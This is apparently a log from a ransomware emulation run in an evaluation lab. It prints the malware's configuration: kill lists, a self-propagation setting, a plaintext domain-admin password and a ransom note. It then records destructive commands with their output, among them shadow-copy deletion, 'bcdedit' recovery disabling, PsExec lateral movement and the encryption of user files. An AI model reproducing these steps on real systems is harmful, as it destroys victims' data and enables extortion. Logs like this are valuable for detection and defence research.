[INFO]  [2023-10-18 16:31:52] Loaded configuration information.
[INFO]  [2023-10-18 16:31:52] Current configuration:  
    kill_processes: ["msedge", "encsvc", "mydesktopqos", "xfssvccon", "firefox", "infopath", "winword", "steam", "synctime", "notepad", "ocomm", "onenote", "mspub", "thunderbird", "agntsvc", "sql", "excel", "powerpnt", "outlook", "wordpad", "isqlplussvc", "sqbcoreservice", "oracle", "ocautoupds", "dbsnmp", "msaccess", "tbirdconfig", "ocssd", "mydesktopservice", "visio", "mepocs", "memtas", "veeam", "backup", "sql", "vss", "msexchange"]
    kill_services: ["BDESVC", "MSSQLSERVER", "SDRSVC", "VSS", "wuauserv"]
    kill_processes_linux: ["libvirtd", "virsh", "libvirt-dbus"]
    kill_services_linux: ["libvirtd"]
    exclude_directory_names: ["system volume information", "intel", "$windows.~ws", "application data", "$recycle.bin", "mozilla", "program files (x86)", "program files", "$windows.~bt", "public", "msocache", "windows", "default", "all users", "tor browser", "programdata", "boot", "config.msi", "google", "perflogs", "appdata", "windows.old", "WindowsAzure"]
    exclude_file_names: ["desktop.ini", "autorun.inf", "ntldr", "bootsect.bak", "thumbs.db", "boot.ini", "ntuser.dat", "iconcache.db", "bootfont.bin", "ntuser.ini", "ntuser.dat.log"]
    exclude_file_extensions: ["themepack", "nls", "diagpkg", "msi", "lnk", "exe", "cab", "scr", "bat", "drv", "rtp", "msp", "prf", "msc", "ico", "key", "ocx", "diagcab", "diagcfg", "pdb", "wpx", "hlp", "icns", "rom", "dll", "msstyles", "mod", "ps1", "ics", "hta", "bin", "cmd", "ani", "386", "lock", "cur", "idx", "sys", "com", "deskthemepack", "shs", "ldf", "theme", "mpa", "nomedia", "spl", "cpl", "adv", "icl", "msu", "xtlog"]
    strict_include_paths: []
    enable_set_wallpaper: true
    enable_network_discovery: true
    enable_self_propagation: true
    enable_vm_kill: true
    enable_vm_snapshot_kill: true
    enable_enc: true
    enable_recovery_hampering: true
    enable_event_del: true
    enable_hidden_partitions: true
    unmount_hidden_partitions: true
    extension: .skyfl2e
    note_file_name: RECOVER-SKYFL2E-FILES.txt
    note_full_text: >>Introduction
Important files on your machine were ENCRYPTED and now they have the "SKYFL2E" extension.
In order to recover your files, you need to follow the instructions below.

>>CAUTION
DO NOT MODIFY ENCRYPTED FILES YOURSELF.
DO NOT USE THIRD PARTY SOFTWARE TO RESTORE YOUR DATA.
YOU MAY DAMAGE YOUR FILES, RESULTING IN PERMANENT DATA LOSS.
YOUR DATA IS STRONGLY ENCRYPTED, YOU CANNOT DECRYPT IT WITHOUT CIPHER KEY.

>>What Should I do Next?
Follow these simple steps to get everything back to normal:
1) Download and install Tor browser from https://www.torproject.org/download/
2) Navigate to: askfjejtqekjge0et1lkjasdq09gji13jgkdajv.testonion/?access-key=2646AEF615CD1126

    empty_recycle_bin: true
    psexec_username: digirunaway\evals_domain_admin
    psexec_password: axi9eengei9inaeR@
    strict_include_targets: ["10.10.20.22"]

[INFO]  [2023-10-18 16:31:52] Running ELEVATED
[INFO]  [2023-10-18 16:31:52] Created encryption thread pool of size 12
[INFO]  [2023-10-18 16:31:52] Deleting shadow copies.
[DEBUG] [2023-10-18 16:31:52] Initializing COM
[DEBUG] [2023-10-18 16:31:52] Initialized COM
[DEBUG] [2023-10-18 16:31:52] Initializing COM security
[DEBUG] [2023-10-18 16:31:52] Initialized COM security
[DEBUG] [2023-10-18 16:31:52] Creating backup components
[DEBUG] [2023-10-18 16:31:52] Created backup components
[DEBUG] [2023-10-18 16:31:52] Initializing for backup
[DEBUG] [2023-10-18 16:31:52] Initialized for backup
[DEBUG] [2023-10-18 16:31:52] Setting context
[DEBUG] [2023-10-18 16:31:52] Context set
[DEBUG] [2023-10-18 16:31:52] Setting backup state
[DEBUG] [2023-10-18 16:31:52] Backup state set
[DEBUG] [2023-10-18 16:31:52] Querying for snapshots
[DEBUG] [2023-10-18 16:31:52] Snapshots queried
[DEBUG] [2023-10-18 16:31:52] Fetching shadows
[DEBUG] [2023-10-18 16:31:52] Snapshot queried
[INFO]  [2023-10-18 16:31:52] Snapshot: 19780337092698417731
[INFO]  [2023-10-18 16:31:52] Deleting snapshot
[INFO]  [2023-10-18 16:31:52] Deleted snapshot
[DEBUG] [2023-10-18 16:31:52] Finished processing Shadow Copies.
[INFO]  [2023-10-18 16:31:52] Successfully deleted shadow copies.
[INFO]  [2023-10-18 16:31:52] Disabling bootloader recovery.
[DEBUG] [2023-10-18 16:31:52] Executing: bcdedit /set {default} recoveryenabled no
[DEBUG] [2023-10-18 16:31:52] bcdedit exited with exit code: 0
[DEBUG] [2023-10-18 16:31:52] bcdedit stdout: The operation completed successfully.

[DEBUG] [2023-10-18 16:31:52] bcdedit stderr: 
[INFO]  [2023-10-18 16:31:52] Successfully disabled bootloader recovery
[INFO]  [2023-10-18 16:31:52] Determining system UUID.
[DEBUG] [2023-10-18 16:31:52] Executing: wmic csproduct get UUID
[DEBUG] [2023-10-18 16:31:53] wmic exited with exit code: 0
[INFO]  [2023-10-18 16:31:53] CSProduct UUID is 0CACA482-2C2E-4882-8D48-446DF108319A
[INFO]  [2023-10-18 16:31:53] System ID: 0CACA482-2C2E-4882-8D48-446DF108319A
[INFO]  [2023-10-18 16:31:53] Currently running as user: DIGIRUNAWAY.NET\evals_domain_admin
[INFO]  [2023-10-18 16:31:53] Currently running on host: kimeramon
[INFO]  [2023-10-18 16:31:53] Enabling remote-to-local and remote-to-remote symbolic link evaluation.
[DEBUG] [2023-10-18 16:31:53] Executing: fsutil behavior set SymlinkEvaluation R2L:1
[DEBUG] [2023-10-18 16:31:53] fsutil exited with exit code: 0
[DEBUG] [2023-10-18 16:31:53] fsutil remote-to-local stdout: Remote-to-local symbolic link evaluation is: ENABLED

[DEBUG] [2023-10-18 16:31:53] fsutil remote-to-local stderr: 
[DEBUG] [2023-10-18 16:31:53] Executing: fsutil behavior set SymlinkEvaluation R2R:1
[DEBUG] [2023-10-18 16:31:53] fsutil exited with exit code: 0
[DEBUG] [2023-10-18 16:31:53] fsutil remote-to-remote stdout: Remote-to-remote symbolic link evaluation is: ENABLED

[DEBUG] [2023-10-18 16:31:53] fsutil remote-to-remote stderr: 
[INFO]  [2023-10-18 16:31:53] Successfully enabled remote-to-local and remote-to-remote symbolic link evaluation
[INFO]  [2023-10-18 16:31:53] Emptying recycle bin
[INFO]  [2023-10-18 16:31:53] Found 0 items in recycling bin.
[INFO]  [2023-10-18 16:31:53] No items found in recycling bin. Skipping.
[INFO]  [2023-10-18 16:31:53] Setting MaxMpxCt value in registry.
[DEBUG] [2023-10-18 16:31:53] Opened existing key HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters
[INFO]  [2023-10-18 16:31:53] MaxMpxCt update successful
[INFO]  [2023-10-18 16:31:53] Performing NetBIOS network discovery to find remote hosts.
[INFO]  [2023-10-18 16:31:53] Looking up target machine's local IPs and CIDR masks.
[DEBUG] [2023-10-18 16:31:53] Resizing buffer for GetAdaptersInfo to 2112
[DEBUG] [2023-10-18 16:31:53] Walking through adapter info linked list
[DEBUG] [2023-10-18 16:31:53] Found adapter name {F698ABC1-B83F-4B1B-AD0E-F9ED9C7B82A1}
[DEBUG] [2023-10-18 16:31:53] Found IP address and CIDR 10.10.20.11/24 for adapter {F698ABC1-B83F-4B1B-AD0E-F9ED9C7B82A1}
[DEBUG] [2023-10-18 16:31:53] Found adapter name {270DB5E4-2D1E-4A11-9347-626537E70D6A}
[DEBUG] [2023-10-18 16:31:53] Found IP address and CIDR 10.10.20.12/24 for adapter {270DB5E4-2D1E-4A11-9347-626537E70D6A}
[DEBUG] [2023-10-18 16:31:53] Found adapter name {1699607A-2277-4512-8A84-AC24CE89A04E}
[DEBUG] [2023-10-18 16:31:53] Found IP address and CIDR 10.10.20.13/24 for adapter {1699607A-2277-4512-8A84-AC24CE89A04E}
[INFO]  [2023-10-18 16:31:53] Target machine's local IPs and CIDR masks discovered: [(10.10.20.11, 24), (10.10.20.12, 24), (10.10.20.13, 24)]
[INFO]  [2023-10-18 16:31:53] Scanning from 10.10.20.227 to 10.10.20.176 (251 total, ignoring own IP addresses)
[DEBUG] [2023-10-18 16:31:55] Timed out when connecting to 10.10.20.171
[DEBUG] [2023-10-18 16:31:55] Timed out when connecting to 10.10.20.136
[DEBUG] [2023-10-18 16:31:55] Timed out when connecting to 10.10.20.227
...
[DEBUG] [2023-10-18 16:32:01] Received response from 10.10.20.22
...
[INFO]  [2023-10-18 16:32:11] Discovered the following hosts:
[INFO]  [2023-10-18 16:32:11] 10.10.20.22     DIGIRUNAWAY\GHOSTMON            60:45:BD:D3:6E:90
[INFO]  [2023-10-18 16:32:11] Filtering out any IPs not in the strict_include_targets setting value: ["10.10.20.22"]
[INFO]  [2023-10-18 16:32:11] Found local targets: [10.10.20.22]
[INFO]  [2023-10-18 16:32:11] Performing PsExec propagation.
[INFO]  [2023-10-18 16:32:11] setup_psexec executed successfully
[INFO]  [2023-10-18 16:32:11] PsExec Target IP: "10.10.20.22"
[DEBUG] [2023-10-18 16:32:11] Executing: C:\Users\EVALS_~1\AppData\Local\Temp\pmanager.exe -accepteula \\10.10.20.22 -u digirunaway\evals_domain_admin -p axi9eengei9inaeR@ -s -d -f -c C:\Users\evals_domain_admin\filemanager.exe --access-token 15742aa362a84ba3 --no-prop
[DEBUG] [2023-10-18 16:32:53] C:\Users\EVALS_~1\AppData\Local\Temp\pmanager.exe exited with exit code: 13496
[INFO]  [2023-10-18 16:32:53] stdout: 
PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com


[INFO]  [2023-10-18 16:32:53] stderr: Connecting to 10.10.20.22...
Starting PSEXESVC service on 10.10.20.22...
Copying authentication key to 10.10.20.22...
Connecting with PsExec service on 10.10.20.22...
Copying C:\Users\evals_domain_admin\filemanager.exe to 10.10.20.22...
Starting C:\Users\evals_domain_admin\filemanager.exe on 10.10.20.22...

filemanager.exe started on 10.10.20.22 with process ID 13496.

[INFO]  [2023-10-18 16:32:53] run_psexec executed successfully for target 10.10.20.22
[INFO]  [2023-10-18 16:32:53] Removed the dropped PsExec executable.
[INFO]  [2023-10-18 16:32:53] Propagation complete
[INFO]  [2023-10-18 16:32:53] Searching for and mounting hidden partitions.
[DEBUG] [2023-10-18 16:32:53] Processing volume \\?\Volume{36015bbf-ba75-4894-bd71-3fd568b9df40}\
[INFO]  [2023-10-18 16:32:53] No volume paths found. Mounting this volume.
[DEBUG] [2023-10-18 16:32:53] Using C:\zQ4ADk0l4F\ as the mount point.
[DEBUG] [2023-10-18 16:32:53] Finished processing volume \\?\Volume{36015bbf-ba75-4894-bd71-3fd568b9df40}\
[INFO]  [2023-10-18 16:32:53] Mounted \\?\Volume{36015bbf-ba75-4894-bd71-3fd568b9df40}\ to C:\zQ4ADk0l4F\
[DEBUG] [2023-10-18 16:32:53] Processing volume \\?\Volume{4f4c42f3-eca1-472e-a383-3754480046e7}\
[DEBUG] [2023-10-18 16:32:53] Found volume path name: C:\. Skipping mounting.
[DEBUG] [2023-10-18 16:32:53] Finished processing volume \\?\Volume{4f4c42f3-eca1-472e-a383-3754480046e7}\
[DEBUG] [2023-10-18 16:32:53] Processing volume \\?\Volume{c894390b-b542-496c-873d-018077f4bcd9}\
[INFO]  [2023-10-18 16:32:53] No volume paths found. Mounting this volume.
[DEBUG] [2023-10-18 16:32:53] Using C:\XPPyCbGtAh\ as the mount point.
[DEBUG] [2023-10-18 16:32:53] Finished processing volume \\?\Volume{c894390b-b542-496c-873d-018077f4bcd9}\
[INFO]  [2023-10-18 16:32:53] Mounted \\?\Volume{c894390b-b542-496c-873d-018077f4bcd9}\ to C:\XPPyCbGtAh\
[DEBUG] [2023-10-18 16:32:53] Processing volume \\?\Volume{318166d1-6468-11ee-97a7-806e6f6e6963}\
[DEBUG] [2023-10-18 16:32:53] Found volume path name: D:\. Skipping mounting.
[DEBUG] [2023-10-18 16:32:53] Finished processing volume \\?\Volume{318166d1-6468-11ee-97a7-806e6f6e6963}\
[DEBUG] [2023-10-18 16:32:53] Finished iterating through volumes.
[DEBUG] [2023-10-18 16:32:53] Closed find volume handle.
[INFO]  [2023-10-18 16:32:53] Finished mounting hidden partitions
[INFO]  [2023-10-18 16:32:53] Generating AES key.
[INFO]  [2023-10-18 16:32:53] AES key set to: 15fc6e57c4f0eeef5cfe8d2032df8f4d
[INFO]  [2023-10-18 16:32:53] Terminating processes and services that may interfere with encryption.
[INFO]  [2023-10-18 16:32:53] Trying to kill services ["BDESVC", "MSSQLSERVER", "SDRSVC", "VSS", "wuauserv"]
[DEBUG] [2023-10-18 16:32:53] Connected to local Service Control Manager.
[DEBUG] [2023-10-18 16:32:53] Checking status for service BDESVC
[INFO]  [2023-10-18 16:32:53] BDESVC service is already stopped. Skipping.
[INFO]  [2023-10-18 16:32:53] MSSQLSERVER service does not exist. Skipping
[DEBUG] [2023-10-18 16:32:53] Checking status for service SDRSVC
[INFO]  [2023-10-18 16:32:53] SDRSVC service is already stopped. Skipping.
[DEBUG] [2023-10-18 16:32:53] Checking status for service VSS
[DEBUG] [2023-10-18 16:32:53] Enumerating dependent services for service VSS
[DEBUG] [2023-10-18 16:32:53] VSS has no dependent services to stop.
[DEBUG] [2023-10-18 16:32:53] Sending stop code to service VSS
[DEBUG] [2023-10-18 16:32:53] Sent stop code. Waiting for stop.
[DEBUG] [2023-10-18 16:32:54] Service stopped successfully.
[DEBUG] [2023-10-18 16:32:54] Checking status for service wuauserv
[DEBUG] [2023-10-18 16:32:54] Enumerating dependent services for service wuauserv
[DEBUG] [2023-10-18 16:32:54] wuauserv has no dependent services to stop.
[DEBUG] [2023-10-18 16:32:54] Sending stop code to service wuauserv
[DEBUG] [2023-10-18 16:32:54] Sent stop code. Waiting for stop.
[DEBUG] [2023-10-18 16:33:04] Service stopped successfully.
[INFO]  [2023-10-18 16:33:04] Finished terminating services.
[INFO]  [2023-10-18 16:33:04] Attempting to kill processes ["msedge", "encsvc", "mydesktopqos", "xfssvccon", "firefox", "infopath", "winword", "steam", "synctime", "notepad", "ocomm", "onenote", "mspub", "thunderbird", "agntsvc", "sql", "excel", "powerpnt", "outlook", "wordpad", "isqlplussvc", "sqbcoreservice", "oracle", "ocautoupds", "dbsnmp", "msaccess", "tbirdconfig", "ocssd", "mydesktopservice", "visio", "mepocs", "memtas", "veeam", "backup", "sql", "vss", "msexchange"]
[INFO]  [2023-10-18 16:33:04] Successfully terminated process msedge.exe with PID 17568
[INFO]  [2023-10-18 16:33:04] Successfully terminated process msedge.exe with PID 12408
[INFO]  [2023-10-18 16:33:04] Successfully terminated process msedge.exe with PID 10372
[INFO]  [2023-10-18 16:33:04] Successfully terminated process msedge.exe with PID 18284
[INFO]  [2023-10-18 16:33:04] Successfully terminated process msedge.exe with PID 7156
[INFO]  [2023-10-18 16:33:04] Successfully terminated process msedge.exe with PID 7568
[INFO]  [2023-10-18 16:33:04] Successfully terminated process msedge.exe with PID 14608
[INFO]  [2023-10-18 16:33:04] Successfully terminated process Notepad.exe with PID 18624
[INFO]  [2023-10-18 16:33:04] Successfully terminated process msedge.exe with PID 9152
[INFO]  [2023-10-18 16:33:04] Finished iterating through processes.
[INFO]  [2023-10-18 16:33:04] Beginning enumeration and encryption.
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\DumpStack.log.tmp : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\evals_domain_admin\ntuser.dat.LOG1 : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\evals_domain_admin\ntuser.dat.LOG2 : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\evals_domain_admin\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TM.blf : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\evals_domain_admin\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TMContainer00000000000000000001.regtrans-ms : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\evals_domain_admin\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TMContainer00000000000000000002.regtrans-ms : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\kmimi\ntuser.dat.LOG1 : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\mtaichi\ntuser.dat.LOG1 : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\mtaichi\ntuser.dat.LOG2 : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Recovery\ReAgentOld.xml
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\zorimoto\ntuser.dat.LOG1 : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\zorimoto\ntuser.dat.LOG2 : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\zorimoto\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TM.blf : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\zorimoto\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TMContainer00000000000000000001.regtrans-ms : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\zorimoto\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TMContainer00000000000000000002.regtrans-ms : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\CollectGuestLogsTemp\VMAgentLogs.zip
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\CollectGuestLogsTemp\VMAgentLogs.zip.json
[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\WindowsAzure\CollectGuestLogsTemp\RECOVER-SKYFL2E-FILES.txt
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\evals_domain_admin\Searches\Everywhere.search-ms : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\evals_domain_admin\Searches\Indexed Locations.search-ms : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\evals_domain_admin\Favorites\Bing.url
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Config\c9491062-b23a-4c39-a305-f1ebf32d4b60.c9491062-b23a-4c39-a305-f1ebf32d4b60._msr2-proto1-evals-a-bastion.1.xml
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\kmimi\ntuser.dat.LOG2
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\evals_domain_admin\.ssh\known_hosts.old
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\MonitoringAgent.2023.10.06-16.53.43.log
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\kmimi\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TM.blf
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\mtaichi\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TM.blf
[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Users\evals_domain_admin\.ssh\RECOVER-SKYFL2E-FILES.txt
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\MonitoringAgent.2023.10.06-17.24.54.log
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\windesk\ntuser.dat.LOG1
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\windesk\ntuser.dat.LOG2 : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\kmimi\.ssh\known_hosts.old
[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Recovery\RECOVER-SKYFL2E-FILES.txt
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\AppAgentRuntime.ini
[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Users\kmimi\.ssh\RECOVER-SKYFL2E-FILES.txt
[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Users\evals_domain_admin\Favorites\RECOVER-SKYFL2E-FILES.txt
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\kmimi\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TMContainer00000000000000000001.regtrans-ms
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\AppAgentRuntime.mcf
[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\WindowsAzure\Config\RECOVER-SKYFL2E-FILES.txt
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\mtaichi\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TMContainer00000000000000000001.regtrans-ms
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\mtaichi\Favorites\Bing.url
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\mtaichi\Searches\Everywhere.search-ms : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\mtaichi\Searches\Indexed Locations.search-ms : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\AzureEvents.man
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\mtaichi\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TMContainer00000000000000000002.regtrans-ms
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\kmimi\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TMContainer00000000000000000002.regtrans-ms
[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Users\mtaichi\Favorites\RECOVER-SKYFL2E-FILES.txt
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\kmimi\Searches\Everywhere.search-ms : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Users\mtaichi\RECOVER-SKYFL2E-FILES.txt
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\CollectVMHealth.exe.config
[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Users\kmimi\RECOVER-SKYFL2E-FILES.txt
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\kmimi\Searches\Indexed Locations.search-ms : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\WindowsAzure\Logs\MonitoringAgent.log : "Could not add extension to encrypted file: The process cannot access the file because it is being used by another process. (os error 32)"
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\WindowsAzure\Logs\RuntimeEvents_000002.etl : Os { code: 32, kind: Uncategorized, message: "The process cannot access the file because it is being used by another process." }
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\CommonAgentConfig.config
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\IISConfigurator-Ipv4only.exe.config
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\IISConfigurator-Ipv6andIpv4.exe.config
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\IpAddressAssignment.exe.config
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\PackageInformation.txt
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\ProviderGuids.txt
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\TransparentInstaller.dll.config
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\WaAppAgent.exe.config
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\WindowsAzureGuestAgent.exe.config
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\zip.baseline
[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\WindowsAzure\GuestAgent_2.7.41491.1095_2023-10-06_165314\RECOVER-SKYFL2E-FILES.txt
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Recovery\WindowsRE\boot.sdi
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\evals_domain_admin\Documents\Default.rdp : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\kmimi\Favorites\Bing.url
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\zorimoto\Searches\Everywhere.search-ms : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\zorimoto\Favorites\Bing.url
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\AggregateStatus\aggregatestatus.json
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\zorimoto\Desktop\bitsadmin_test.txt
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\windesk\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TM.blf
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\zorimoto\Searches\Indexed Locations.search-ms : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\zorimoto\Desktop\rclone_test.txt
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\windesk\Favorites\Bing.url
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\zorimoto\Desktop\scp_test.txt
[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Users\zorimoto\Desktop\RECOVER-SKYFL2E-FILES.txt
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\AggregateStatus\aggregatestatus_20231018163036177.json
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\AggregateStatus\aggregatestatus_20231018163051224.json
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\windesk\Searches\Everywhere.search-ms : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Users\windesk\Searches\Indexed Locations.search-ms : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Users\kmimi\Favorites\RECOVER-SKYFL2E-FILES.txt
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\windesk\Searches\winrt--{S-1-5-21-3944120121-2183016445-1198627938-500}-.searchconnector-ms
[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Users\windesk\Searches\RECOVER-SKYFL2E-FILES.txt
[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Users\windesk\Favorites\RECOVER-SKYFL2E-FILES.txt
[INFO]  [2023-10-18 16:33:04] Ransom note written to C:\Users\zorimoto\Favorites\RECOVER-SKYFL2E-FILES.txt
[ERROR] [2023-10-18 16:33:04] Failed to encrypt C:\Recovery\WindowsRE\ReAgent.xml : Os { code: 5, kind: PermissionDenied, message: "Access is denied." }
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\windesk\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TMContainer00000000000000000001.regtrans-ms
[DEBUG] [2023-10-18 16:33:04] C:\Recovery\WindowsRE\Winre.wim has huge size of 640607700 bytes - encrypting via chunk method.
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\AggregateStatus\aggregatestatus_20231018163106240.json
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\WindowsAzure\Logs\AggregateStatus\aggregatestatus_20231018163121253.json
[DEBUG] [2023-10-18 16:33:04] Encrypted C:\Users\windesk\NTUSER.DAT{18a6cc8d-1db3-11ee-97a4-00155d002401}.TMContainer00000000000000000002.regtrans-ms
